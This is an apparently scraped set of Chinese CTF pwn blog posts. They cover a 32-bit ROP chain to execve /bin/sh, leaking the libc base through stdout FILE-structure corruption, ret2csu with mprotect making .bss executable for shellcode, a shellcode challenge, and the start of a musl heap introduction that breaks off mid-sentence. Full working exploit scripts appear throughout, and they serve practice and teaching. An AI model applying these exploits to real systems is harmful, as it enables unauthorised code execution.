inc eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0806c943) # int 0x80\n\n他已经自动帮我们生成好脚本了  我们只需要手动加上偏移 就可以pwn成功\n但是这里需要注意 你需要添加一个库 如果没有这个库 脚本会报错\nTraceback (most recent call last):  File &quot;/home/chen/exp.py&quot;, line 51, in &lt;module&gt;    p += pack(&#x27;&lt;I&#x27;, 0x0806ecda) # pop edx ; ret  File &quot;/home/chen/.local/lib/python3.6/site-packages/pwnlib/util/packing.py&quot;, line 102, in pack    if sign is None and number &lt; 0:TypeError: &#x27;&lt;&#x27; not supported between instances of &#x27;str&#x27; and &#x27;int&#x27;\n\n库:\nfrom struct import pack\n\n完整exp:\nfrom pwn import*from struct import packdef libcmath(function_addr,function_name):    libc_addr = function_addr - libc.sym[function_name]    system_addr = libc_addr + libc.sym[&#x27;system&#x27;]    binsh_addr = libc_addr + next(libc.search(b&quot;/bin/sh&quot;))    return system_addr,binsh_addrdef csu(offset,gadget2_addr,call_addr,rdx,rsi,rdi,gadget1_addr,ret_addr):    payload = cyclic(offset)    payload += p64(gadget2_addr)    payload += cyclic(0x8)    payload += p64(0)    payload += p64(1)    payload += p64(call_addr)    payload += p64(rdx)    payload += p64(rsi)    payload += p64(rdi)    payload += p64(gadget1_addr)    payload += cyclic(56)    payload += p64(ret_addr)    return payloaddef localconnect(filename):    io = process(filename)    return iodef remoteconnect(ip,port):    io = remote(ip,port)    return iodef elf_libc(filename,libc_name):    elf = ELF(filename)    libc = ELF(libc_name)    return elf,libcdef debug(button):    if(button==1):        context.log_level = &quot;debug&quot;filename = &#x27;pwn&#x27;libc_name = &#x27;buu_libc_ubuntu16_32&#x27;ip=&quot;node4.buuoj.cn&quot;port=27246elf,libc = elf_libc(filename,libc_name)io = remoteconnect(ip,port)debug(1)p = b&#x27;a&#x27; * (0xc+0x4)p += pack(&#x27;&lt;I&#x27;, 0x0806ecda) # pop edx ; retp += pack(&#x27;&lt;I&#x27;, 0x080ea060) # @ .datap += pack(&#x27;&lt;I&#x27;, 0x080b8016) # pop eax ; retp += b&#x27;/bin&#x27;p += pack(&#x27;&lt;I&#x27;, 0x0805466b) # mov dword ptr [edx], eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0806ecda) # pop edx ; retp += pack(&#x27;&lt;I&#x27;, 0x080ea064) # @ .data + 4p += pack(&#x27;&lt;I&#x27;, 0x080b8016) # pop eax ; retp += b&#x27;//sh&#x27;p += pack(&#x27;&lt;I&#x27;, 0x0805466b) # mov dword ptr [edx], eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0806ecda) # pop edx ; retp += pack(&#x27;&lt;I&#x27;, 0x080ea068) # @ .data + 8p += pack(&#x27;&lt;I&#x27;, 0x080492d3) # xor eax, eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0805466b) # mov dword ptr [edx], eax ; retp += pack(&#x27;&lt;I&#x27;, 0x080481c9) # pop ebx ; retp += pack(&#x27;&lt;I&#x27;, 0x080ea060) # @ .datap += pack(&#x27;&lt;I&#x27;, 0x080de769) # pop ecx ; retp += pack(&#x27;&lt;I&#x27;, 0x080ea068) # @ .data + 8p += pack(&#x27;&lt;I&#x27;, 0x0806ecda) # pop edx ; retp += pack(&#x27;&lt;I&#x27;, 0x080ea068) # @ .data + 8p += pack(&#x27;&lt;I&#x27;, 0x080492d3) # xor eax, eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0806c943) # int 0x80io.sendline(p)io.interactive()\n\n","categories":["wp"]},{"title":"iofile泄露libc基址","url":"/2023/01/01/iofile%E6%B3%84%E9%9C%B2libc%E5%9F%BA%E5%9D%80/","content":"部分堆题没有给予我们打印堆块中间的机会 这种情况下 无法通过unsortedbin来泄露基址 这里学习一种新办法 通过io file来泄露基址\n在一个程序中 初始的文件描述符为1,2,3 分别对应着标准输入 标准输出 标准错误 当我们调用scanf函数或者read函数的时候 就会通过调用文件描述符0来从终端输入数据 也就意味着我们可以利用这一点来做到泄露数据\n在linux系统中的IO库 存在FILE文件流来描述文件 其初始创建的三个文件stdin、stdout、stderr位于libc上 而接下来创建的位于堆中 并且其是一个单向链表结构 定义此结构体为_IO_FILE_plus\nstruct _IO_FILE_plus&#123;    _IO_FILE    file;    _IO_jump_t   *vtable;&#125;\n\nlibc2.23以后 有一个全局变量_IO_list_all 指向了FILE文件的链表头\n随便打开一个程序 gdb看一下_IO_list_all的内容\npwndbg&gt; p /x *(struct _IO_FILE_plus *) _IO_list_all$14 = &#123;  file = &#123;    _flags = 0xfbad2086,     _IO_read_ptr = 0x0,     _IO_read_end = 0x0,     _IO_read_base = 0x0,     _IO_write_base = 0x0,     _IO_write_ptr = 0x0,     _IO_write_end = 0x0,     _IO_buf_base = 0x0,     _IO_buf_end = 0x0,     _IO_save_base = 0x0,     _IO_backup_base = 0x0,     _IO_save_end = 0x0,     _markers = 0x0,     _chain = 0x7ffff7dce760,     _fileno = 0x2,     _flags2 = 0x0,     _old_offset = 0xffffffffffffffff,     _cur_column = 0x0,     _vtable_offset = 0x0,     _shortbuf = &#123;0x0&#125;,     _lock = 0x7ffff7dcf8b0,     _offset = 0xffffffffffffffff,     _codecvt = 0x0,     _wide_data = 0x7ffff7dcd780,     _freeres_list = 0x0,     _freeres_buf = 0x0,     __pad5 = 0x0,     _mode = 0x0,     _unused2 = &#123;0x0 &lt;repeats 20 times&gt;&#125;  &#125;,   vtable = 0x7ffff7dca2a0&#125;\n\n其中file结构中的_chain指向了下一个FILE文件 即stdout 而stdout指向stdin\nvtable则是一个指针 跟进一下其内容\npwndbg&gt; p _IO_file_jumps$19 = &#123;  __dummy = 0,   __dummy2 = 0,   __finish = 0x7ffff7a6e2d0 &lt;_IO_new_file_finish&gt;,   __overflow = 0x7ffff7a6f2b0 &lt;_IO_new_file_overflow&gt;,   __underflow = 0x7ffff7a6efd0 &lt;_IO_new_file_underflow&gt;,   __uflow = 0x7ffff7a70370 &lt;__GI__IO_default_uflow&gt;,   __pbackfail = 0x7ffff7a71c00 &lt;__GI__IO_default_pbackfail&gt;,   __xsputn = 0x7ffff7a6d8d0 &lt;_IO_new_file_xsputn&gt;,   __xsgetn = 0x7ffff7a6d530 &lt;__GI__IO_file_xsgetn&gt;,   __seekoff = 0x7ffff7a6cb30 &lt;_IO_new_file_seekoff&gt;,   __seekpos = 0x7ffff7a70940 &lt;_IO_default_seekpos&gt;,   __setbuf = 0x7ffff7a6c7f0 &lt;_IO_new_file_setbuf&gt;,   __sync = 0x7ffff7a6c670 &lt;_IO_new_file_sync&gt;,   __doallocate = 0x7ffff7a600b0 &lt;__GI__IO_file_doallocate&gt;,   __read = 0x7ffff7a6d8b0 &lt;__GI__IO_file_read&gt;,   __write = 0x7ffff7a6d130 &lt;_IO_new_file_write&gt;,   __seek = 0x7ffff7a6c8b0 &lt;__GI__IO_file_seek&gt;,   __close = 0x7ffff7a6c7e0 &lt;__GI__IO_file_close&gt;,   __stat = 0x7ffff7a6d120 &lt;__GI__IO_file_stat&gt;,   __showmanyc = 0x7ffff7a71d80 &lt;_IO_default_showmanyc&gt;,   __imbue = 0x7ffff7a71d90 &lt;_IO_default_imbue&gt;&#125;\n\n其指向了_IO_file_jumps结构 该结构为所有的FILE文件所共用 存储的是一些函数的指针 我们也可以通过修改这些函数指针或者在可写区域伪造一个vtable结构 不过本文不做介绍 自行了解\n回到FILE文件结构体 你在一系列变量中可以找到_fileno 其对应的值就是文件描述符 这里也存在利用漏洞\npwndbg&gt; p _IO_2_1_stdin_$20 = &#123;  file = &#123;    _flags = -72540024,     _IO_read_ptr = 0x0,     _IO_read_end = 0x0,     _IO_read_base = 0x0,     _IO_write_base = 0x0,     _IO_write_ptr = 0x0,     _IO_write_end = 0x0,     _IO_buf_base = 0x0,     _IO_buf_end = 0x0,     _IO_save_base = 0x0,     _IO_backup_base = 0x0,     _IO_save_end = 0x0,     _markers = 0x0,     _chain = 0x0,     _fileno = 0,     _flags2 = 0,     _old_offset = -1,     _cur_column = 0,     _vtable_offset = 0 &#x27;\\000&#x27;,     _shortbuf = &quot;&quot;,     _lock = 0x7ffff7dcf8d0 &lt;_IO_stdfile_0_lock&gt;,     _offset = -1,     _codecvt = 0x0,     _wide_data = 0x7ffff7dcdae0 &lt;_IO_wide_data_0&gt;,     _freeres_list = 0x0,     _freeres_buf = 0x0,     __pad5 = 0,     _mode = 0,     _unused2 = &#x27;\\000&#x27; &lt;repeats 19 times&gt;  &#125;,   vtable = 0x7ffff7dca2a0 &lt;_IO_file_jumps&gt;&#125;\n\n如果程序通过文件描述符4将flag的值读入 那么我们可以通过修改1 2 3文件描述符的值来达到攻击目的 这里同样不扩展\n那么我们是如何通过FILE文件结构达到泄露基址的目的呢? 让我们阅读一下puts函数的源码\n#include &quot;libioP.h&quot;#include &lt;string.h&gt;#include &lt;limits.h&gt;int_IO_puts (const char *str)&#123;  int result = EOF;  size_t len = strlen (str);  _IO_acquire_lock (stdout);  if ((_IO_vtable_offset (stdout) != 0       || _IO_fwide (stdout, -1) == -1)      &amp;&amp; _IO_sputn (stdout, str, len) == len      &amp;&amp; _IO_putc_unlocked (&#x27;\\n&#x27;, stdout) != EOF)    result = MIN (INT_MAX, len + 1);  _IO_release_lock (stdout);  return result;&#125;weak_alias (_IO_puts, puts)libc_hidden_def (_IO_puts)\n\n其调用了一个关键函数 _IO_sputn 我们需要跟进一下该函数\nextern size_t _IO_new_file_xsputn (FILE *, const void *, size_t);\n\n执行sputn函数的过程中同时执行了_IO_new_file_xsputn继续跟进发现 其调用了_IO_overflow函数 这个函数是否眼熟?\n其存在于我们上面介绍的vtable结构中\n最后我们来看起决定作用的_IO_new_file_overflow函数\nint_IO_new_file_overflow (FILE *f, int ch)&#123;  if (f-&gt;_flags &amp; _IO_NO_WRITES) /* SET ERROR */    &#123;      f-&gt;_flags |= _IO_ERR_SEEN;      __set_errno (EBADF);      return EOF;    &#125;  /* If currently reading or no buffer allocated. */  if ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == 0 || f-&gt;_IO_write_base == NULL)    &#123;      /* Allocate a buffer if needed. */      if (f-&gt;_IO_write_base == NULL)\t&#123;\t  _IO_doallocbuf (f);\t  _IO_setg (f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base);\t&#125;      /* Otherwise must be currently reading.\t If _IO_read_ptr (and hence also _IO_read_end) is at the buffer end,\t logically slide the buffer forwards one block (by setting the\t read pointers to all point at the beginning of the block).  This\t makes room for subsequent output.\t Otherwise, set the read pointers to _IO_read_end (leaving that\t alone, so it can continue to correspond to the external position). */      if (__glibc_unlikely (_IO_in_backup (f)))\t&#123;\t  size_t nbackup = f-&gt;_IO_read_end - f-&gt;_IO_read_ptr;\t  _IO_free_backup_area (f);\t  f-&gt;_IO_read_base -= MIN (nbackup,\t\t\t\t   f-&gt;_IO_read_base - f-&gt;_IO_buf_base);\t  f-&gt;_IO_read_ptr = f-&gt;_IO_read_base;\t&#125;      if (f-&gt;_IO_read_ptr == f-&gt;_IO_buf_end)\tf-&gt;_IO_read_end = f-&gt;_IO_read_ptr = f-&gt;_IO_buf_base;      f-&gt;_IO_write_ptr = f-&gt;_IO_read_ptr;      f-&gt;_IO_write_base = f-&gt;_IO_write_ptr;      f-&gt;_IO_write_end = f-&gt;_IO_buf_end;      f-&gt;_IO_read_base = f-&gt;_IO_read_ptr = f-&gt;_IO_read_end;      f-&gt;_flags |= _IO_CURRENTLY_PUTTING;      if (f-&gt;_mode &lt;= 0 &amp;&amp; f-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))\tf-&gt;_IO_write_end = f-&gt;_IO_write_ptr;    &#125;  if (ch == EOF)    return _IO_do_write (f, f-&gt;_IO_write_base,\t\t\t f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);  if (f-&gt;_IO_write_ptr == f-&gt;_IO_buf_end ) /* Buffer is really full */    if (_IO_do_flush (f) == EOF)      return EOF;  *f-&gt;_IO_write_ptr++ = ch;  if ((f-&gt;_flags &amp; _IO_UNBUFFERED)      || ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; ch == &#x27;\\n&#x27;))    if (_IO_do_write (f, f-&gt;_IO_write_base,\t\t      f-&gt;_IO_write_ptr - f-&gt;_IO_write_base) == EOF)      return EOF;  return (unsigned char) ch;&#125;\n\n首先我们需要绕过第一个if判断 那么就使得f-&gt;_flags &amp; _IO_NO_WRITES为0\n接下要绕过第二个判断 那么使得(f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING)为1\n最后其调用了_IO_do_write函数 该函数实际上是new_do_write函数\nstatic size_tnew_do_write (FILE *fp, const char *data, size_t to_do)&#123;  size_t count;  if (fp-&gt;_flags &amp; _IO_IS_APPENDING)    /* On a system without a proper O_APPEND implementation,       you would need to sys_seek(0, SEEK_END) here, but is       not needed nor desirable for Unix- or Posix-like systems.       Instead, just indicate that offset (before and after) is       unpredictable. */    fp-&gt;_offset = _IO_pos_BAD;  else if (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)    &#123;      off64_t new_pos\t= _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, 1);      if (new_pos == _IO_pos_BAD)\treturn 0;      fp-&gt;_offset = new_pos;    &#125;  count = _IO_SYSWRITE (fp, data, to_do);  if (fp-&gt;_cur_column &amp;&amp; count)    fp-&gt;_cur_column = _IO_adjust_column (fp-&gt;_cur_column - 1, data, count) + 1;  _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_buf_base;  fp-&gt;_IO_write_end = (fp-&gt;_mode &lt;= 0\t\t       &amp;&amp; (fp-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))\t\t       ? fp-&gt;_IO_buf_base : fp-&gt;_IO_buf_end);  return count;&#125;\n\n而else if判断式中的fp-&gt;_IO_write_base - fp-&gt;_IO_read_end我们满足不了\n如果fp-&gt;_IO_read_end的值设置为0  那么_IO_SYSSEEK的第二个参数值就会过大\n如果设置fp-&gt;_IO_write_base = fp-&gt;_IO_read_end的话   那么在其它地方就会有问题\n因为fp-&gt;_IO_write_base 不能大于 fp-&gt;_IO_write_end\n所以这里要设置fp-&gt;_flags | _IO_IS_APPENDING，避免进入else if 分支\n综上所述 因此我们要泄露基址的话 需要将flag改为0xfbad1800\n并且随着第四个参数_IO_write_base的不同 可以泄露不同的libc地址(原理不懂 照抄吧)\npayload = p64(0xfbad1800)+p64(0)*3+b&quot;\\x58&quot; //泄露_IO_file_jumps\n\npayload = p64(0xfbad3887)+p64(0)*3+p8(0)  //泄露_IO_2_1_stdin_\n\n","categories":["堆"]},{"title":"mprotect修改bss段权限","url":"/2023/02/04/mprotect%E4%BF%AE%E6%94%B9bss%E6%AE%B5%E6%9D%83%E9%99%90/","content":"这一种办法一般来说不是很实用 当个额外的知识点扩展就好了 难免有的新生赛想考\n在程序开启了NX保护的前提下 我们没有办法通过在bss段写入shellcode后覆盖ret addr为shellcode首地址来实现shell\n这是因为bss段此时的执行权限为rw-p\n\n意为可读可写 但不可执行 所以位于bss段的shellcode无法发挥作用\n但是在c语言中存在一个mprotect函数 其作用为把自start开始的、长度为len的内存区的保护属性修改为prot指定的值\nmprotect(const void *start, size_t len, int prot)\n\nprot为7时 可以设置内存区域权限为rwx-p 即可读可写可执行 这样就能让shellcode起作用\n下面来看一道例题加深理解\njarvisoj_level5checksec看一下保护机制\n[!] Could not populate PLT: future feature annotations is not defined (unicorn.py, line 2)[*] &#x27;/home/chen/pwn&#x27;    Arch:     amd64-64-little    RELRO:    No RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)\n\n没开RELRO 但是开了NX\nida看一下伪代码\nint __cdecl main(int argc, const char **argv, const char **envp)&#123;  vulnerable_function();  return write(1, &quot;Hello, World!\\n&quot;, 0xEuLL);&#125;\n\n跟进一下vulnerable_function函数\nssize_t vulnerable_function()&#123;  char buf[128]; // [rsp+0h] [rbp-80h] BYREF  write(1, &quot;Input:\\n&quot;, 7uLL);  return read(0, buf, 0x200uLL);&#125;\n\n有一次栈溢出的机会 不同于其他经典的ret2libc题目 这题的plt表只有read和write函数 由于write函数泄露函数真实地址需要控制三个寄存器\n所以这里用csu的办法\nfrom pwn import*io = process(&quot;./pwn&quot;)#io = remote(&quot;node4.buuoj.cn&quot;,25692)context.log_level = &quot;debug&quot;context.arch = &quot;amd64&quot;context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]elf = ELF(&quot;./pwn&quot;)#libc = ELF(&quot;buu_libc_ubuntu16_64&quot;)libc = ELF(&quot;./locate_libc2.23&quot;)io.recvuntil(&quot;Input:&quot;)back_addr = 0x4005e6gadget1_addr = 0x400690gadget2_addr = 0x4006AAwrite_got = elf.got[&#x27;write&#x27;]bss_addr = 0x600A88+0x50payload = cyclic(0x80+0x8)+p64(gadget2_addr)payload += p64(0)+p64(1)+p64(write_got)+p64(0x8)+p64(write_got)+p64(1)+p64(gadget1_addr)payload += cyclic(56)+p64(back_addr)io.sendline(payload)write_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))success(hex(write_addr))libc_addr = write_addr - libc.sym[&#x27;write&#x27;]success(hex(libc_addr))\n\n接下来就是构造mprotect函数来实现bss段的权限修改\n同时解答一下pop rsi和pop rdx两条指令哪来的 这题是动态链接 二进制文件中是不存在这两条指令的\n但是如果题目有提供libc文件 也是可以ROPgadget查找libc文件的指令 前提是我们获取了libc基址\nio.recvuntil(&quot;Input:&quot;)mprotect_addr = libc_addr + libc.sym[&#x27;mprotect&#x27;]read_addr = libc_addr + libc.sym[&#x27;read&#x27;]rdi_addr = 0x4006b3rdx_addr = libc_addr + 0x1b92rsi_addr = libc_addr + 0x202f8payload = cyclic(0x80+0x8)+p64(rdi_addr)+p64(0x600000)+p64(rsi_addr)+p64(0x1000)+p64(rdx_addr)+p64(7)+p64(mprotect_addr)+p64(back_addr)io.sendline(payload)\n\ngdb动调看一下mprotect函数是否生效\n\n可以看到0x600000-0x601000的内存区域权限已经被修改为rwxp 可读可写可执行了\n那么接下来我们构造read函数 并且将最后的返回地址设置为shellcode首地址 就可以获取shell\nio.recvuntil(&quot;Input:&quot;)bss_addr = 0x600A88+0x50payload = cyclic(0x80+0x8)+p64(rdi_addr)+p64(0)+p64(rsi_addr)+p64(bss_addr)+p64(rdx_addr)+p64(0x100)+p64(read_addr)+p64(bss_addr)io.sendline(payload)shellcode = asm(shellcraft.sh())io.send(shellcode)io.interactive()\n\n当题目没有给我们libc文件的时候 这时候我们无法通过libc文件来获取pop rsi和pop rdx指令地址来构造rop链 这时候只能通过csu来\n但是csu实现函数调用是使用call指令 call指令需要有一个类似于got表的地址链才能实现\n比如:    bss_addr(存放着main函数的地址)  这时候call bss_addr 就相当于执行main函数\n所以我们跟上面一步相比 还需要多出一个read链来读入mprotect_addr\nexp:\nfrom pwn import*io = process(&quot;./pwn&quot;)#io = remote(&quot;node4.buuoj.cn&quot;,25692)context.log_level = &quot;debug&quot;context.arch = &quot;amd64&quot;context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]elf = ELF(&quot;./pwn&quot;)#libc = ELF(&quot;buu_libc_ubuntu16_64&quot;)libc = ELF(&quot;./locate_libc2.23&quot;)io.recvuntil(&quot;Input:&quot;)back_addr = 0x4005e6gadget1_addr = 0x400690gadget2_addr = 0x4006AAwrite_got = elf.got[&#x27;write&#x27;]bss_addr = 0x600A88+0x50payload = cyclic(0x80+0x8)+p64(gadget2_addr)payload += p64(0)+p64(1)+p64(write_got)+p64(0x8)+p64(write_got)+p64(1)+p64(gadget1_addr)payload += cyclic(56)+p64(back_addr)io.sendline(payload)write_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))success(hex(write_addr))libc_addr = write_addr - libc.sym[&#x27;write&#x27;]success(hex(libc_addr))mprotect_addr = libc_addr + libc.sym[&#x27;mprotect&#x27;]read_got = elf.got[&#x27;read&#x27;]io.recvuntil(&quot;Input:&quot;)payload = cyclic(0x80+0x8)+p64(gadget2_addr)payload += p64(0)+p64(1)+p64(read_got)+p64(0x8)+p64(bss_addr)+p64(0)+p64(gadget1_addr)payload += cyclic(56)+p64(back_addr)io.sendline(payload)io.send(p64(mprotect_addr))io.recvuntil(&quot;Input:&quot;)payload = cyclic(0x80+0x8)+p64(gadget2_addr)payload += p64(0)+p64(1)+p64(bss_addr)+p64(7)+p64(0x1000)+p64(0x600000)+p64(gadget1_addr)payload += cyclic(56)+p64(back_addr)io.sendline(payload)io.recvuntil(&quot;Input:&quot;)payload = cyclic(0x80+0x8)+p64(gadget2_addr)payload += p64(0)+p64(1)+p64(read_got)+p64(0x100)+p64(bss_addr+0x8)+p64(0)+p64(gadget1_addr)payload += cyclic(56)+p64(bss_addr+0x8)io.sendline(payload)shellcode = asm(shellcraft.sh())io.send(shellcode)io.interactive()\n\n","categories":["栈"]},{"title":"mrctf2020_shellcode","url":"/2022/11/23/mrctf2020-shellcode/","content":"这题虽然是很简单的shellcode 但是因为禁用了ida的反编译 需要我们阅读汇编理解程序 就当作提高汇编理解能力了\n[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)[*] &#x27;/home/chen/pwn&#x27;    Arch:     amd64-64-little    RELRO:    Full RELRO    Stack:    No canary found    NX:       NX disabled    PIE:      PIE enabled    RWX:      Has RWX segments\n\n没有开NX保护 可以在内存上执行系统调用\n拖到ida后发现f5报错 于是只能阅读汇编代码\n.text:0000000000001155 ; __unwind &#123;.text:0000000000001155                 push    rbp.text:0000000000001156                 mov     rbp, rsp.text:0000000000001159                 sub     rsp, 410h.text:0000000000001160                 mov     rax, cs:stdin@@GLIBC_2_2_5.text:0000000000001167                 mov     esi, 0          ; buf.text:000000000000116C                 mov     rdi, rax        ; stream.text:000000000000116F                 call    _setbuf.text:0000000000001174                 mov     rax, cs:stdout@@GLIBC_2_2_5.text:000000000000117B                 mov     esi, 0          ; buf.text:0000000000001180                 mov     rdi, rax        ; stream.text:0000000000001183                 call    _setbuf.text:0000000000001188                 mov     rax, cs:stderr@@GLIBC_2_2_5.text:000000000000118F                 mov     esi, 0          ; buf.text:0000000000001194                 mov     rdi, rax        ; stream.text:0000000000001197                 call    _setbuf.text:000000000000119C                 lea     rdi, s          ; &quot;Show me your magic!&quot;    //断点1.text:00000000000011A3                 call    _puts.text:00000000000011A8                 lea     rax, [rbp+buf].text:00000000000011AF                 mov     edx, 400h       ; nbytes.text:00000000000011B4                 mov     rsi, rax        ; buf .text:00000000000011B7                 mov     edi, 0          ; fd.text:00000000000011BC                 mov     eax, 0.text:00000000000011C1                 call    _read                                     //断点2.text:00000000000011C6                 mov     [rbp+var_4], eax.text:00000000000011C9                 cmp     [rbp+var_4], 0.text:00000000000011CD                 jg      short loc_11D6                        //断点3.text:00000000000011CF                 mov     eax, 0.text:00000000000011D4                 jmp     short locret_11E4\n\n断点1:\n在这之前的汇编代码 执行了两步 一是清空缓存区 防止数据输入输出出现问题 第二步调用puts函数输出了一段字符串\n断点2:\n调用了read函数 可以手动反编译为read(0,buf,0x400)\n断点3:\n紧接着将**$eax的值赋给rbp+var_4**  与0进行比较\ncmp的功能相当于减法指令，只是不保存结果\njg指令 如果大于就跳转 即如果$eax大于0就跳转到loc_11D6函数\n.text:00000000000011D6 loc_11D6:                               ; CODE XREF: main+78↑j.text:00000000000011D6                 lea     rax, [rbp+buf].text:00000000000011DD                 call    rax.text:00000000000011DF                 mov     eax, 0\n\nlea指令将$rbp+buf即我们上面通过read输入的变量的地址赋值给rax\n随后利用call指令调用这个地址的内容\n也就是说我们只要直接输入shellcode就可以做到系统调用\nexp:\nfrom pwn import*def libcmath(function_addr,function_name):    libc_addr = function_addr - libc.sym[function_name]    system_addr = libc_addr + libc.sym[&#x27;system&#x27;]    binsh_addr = libc_addr + next(libc.search(b&quot;/bin/sh&quot;))    return system_addr,binsh_addrdef csu(offset,gadget2_addr,call_addr,rdx,rsi,rdi,gadget1_addr,ret_addr):    payload = cyclic(offset)    payload += p64(gadget2_addr)    payload += cyclic(0x8)    payload += p64(0)    payload += p64(1)    payload += p64(call_addr)    payload += p64(rdx)    payload += p64(rsi)    payload += p64(rdi)    payload += p64(gadget1_addr)    payload += cyclic(56)    payload += p64(ret_addr)    return payloaddef localconnect(filename):    io = process(filename)    return iodef remoteconnect(ip,port):    io = remote(ip,port)    return iodef elf_libc(filename,libc_name):    elf = ELF(filename)    libc = ELF(libc_name)    return elf,libcdef debug(button):    if(button==1):        context.log_level = &quot;debug&quot;filename = &#x27;pwn&#x27;libc_name = &#x27;buu_libc_ubuntu16_64&#x27;ip=&quot;node4.buuoj.cn&quot;port=29656elf,libc = elf_libc(filename,libc_name)io = remoteconnect(ip,port)debug(1)io.recvuntil(&quot;Show me your magic!&quot;)context.arch = &quot;amd64&quot;shellcode = asm(shellcraft.sh())io.send(shellcode)io.interactive()\n\n","categories":["wp"]},{"title":"musl","url":"/2023/04/01/musl/","content":"前言musl是一个轻量型的c标准库 与以往我们一直接触的glibc相比 其只需要一个libc.so文件\n\n并且其源代码远远小于glibc 在近几年的ctf比赛中 偶尔会出现基于musl的堆题 musl的堆题和glibc的堆题可谓是牛马不相干 所以本文将详细介绍\n所采取的libc.so版本为1.2.3 \n1.1.x与1.2.x版本有比较大的改动 需要注意一下\n\n调试环境安装pwndbg就不需要我说明了 但是由于musl和glibc的结构体索引不同 所以常规的heap和bin指令并不能使用\nxf1les师傅有编写一款gdb插件 可以供我们调试musl堆\ngit clone https://github.com/xf1les/muslheap.gitecho &quot;source /path/to/muslheap.py&quot; &gt;&gt; ~/.gdbinit\n\nmusl源码可以在下面的地址查找下载 并且通过以下指令编译\nhttps://musl.libc.org/releases/sudo dpkg -i musl_1.2.2-1_amd64.deb\n\n源码分析在musl中 有三级结构来管理堆  从小到大为 chunk group meta\n先来看chunk的构成\nstruct chunk&#123; char prev_user_data[];    uint8_t idx;  //低5bit为idx第几个chunk    uint16_t offset; //与第一个chunk起始地址的偏移，实际地址偏移为offset * UNIT,详细请看get_meta源码中得到group地址的而过程！    char data[];&#125;;\n\n\n就用这三个chunk来说明吧  第一个chunk和后面两个chunk都不一样 其首地址存放了一个堆地址 这是因为其上面是group结构 所以和后面的chunk不同\n接着蓝框部分就是idx 而红框部分则是offset 这里可以看出UNIT实际上是0x10\n#define UNIT 16#define IB 4struct group &#123;    struct meta *meta;    unsigned char active_idx:5;    char pad[UNIT - sizeof(struct meta *) - 1];//padding=0x10B    unsigned char storage[];// chunks&#125;;\n\n接着是group结构 同一类大小的chunk都会被分配到同一个group中\n并且group实际上就是这些chunk内存的总和\n\n例如下面这两个chunk group头就是0xc20和0xc28这0x10大小  红框部分存放的是meta的地址 蓝框部分则是active_idx\n表示当前group能存放多少chunk  例如此时是0xe 那么就相当于[0,e]也就是0xf个\n接着来看一下meta结构体\nstruct meta &#123;    struct meta *prev, *next;//双向链表    struct group *mem;// 这里指向管理的group 地址    volatile int avail_mask, freed_mask;    uintptr_t last_idx:5;    uintptr_t freeable:1;    uintptr_t sizeclass:6;    uintptr_t maplen:8*sizeof(uintptr_t)-12;&#125;;\n\n\nprev和next是双向链表指针 这里只有这一个meta 就指向其自身\nmem则是存放该mata管理的group地址\navail_mask需要转化成二进制形式\n32764 = 110010011101100100\n\n0表示不可分配 1表示可分配 顺序是从右往左\nfreed_mask同样需要转化为二进制形式 并且顺序同上 这里为0也就说明group中没有chunk被释放\nlast_idx表示最多可用的堆块数量 由于是[0,last_idx]所以这里还要加上1 实际上是15\nfree_able 代表当前meta是否可以被回收 1为可 0为不可\nsizeclass则是表示由什么级别的group来管理这些chunk 你可以把其理解为原本glibc中不同size的链表\nconst uint16_t size_classes[] = &#123;\t1, 2, 3, 4, 5, 6, 7, 8,\t9, 10, 12, 15,\t18, 20, 25, 31,\t36, 42, 50, 63,\t72, 84, 102, 127,\t146, 170, 204, 255,\t292, 340, 409, 511,\t584, 682, 818, 1023,\t1169, 1364, 1637, 2047,\t2340, 2730, 3276, 4095,\t4680, 5460, 6552, 8191,&#125;;\n\nmaplen &gt;&#x3D; 1表示这个meta里的group 是新mmap出来的,长度为多少\nmaplen &#x3D;0 表示group 不是新mmap 出来的在size_classes里\n也有一个专门管理各个meta的结构体\nstruct meta_area &#123;    uint64_t check;    struct meta_area *next;    int nslots;    struct meta slots[];&#125;;\n\nmeta_area的地址计算方式如下\nmeta_area_addr = meta &amp; ( -4096 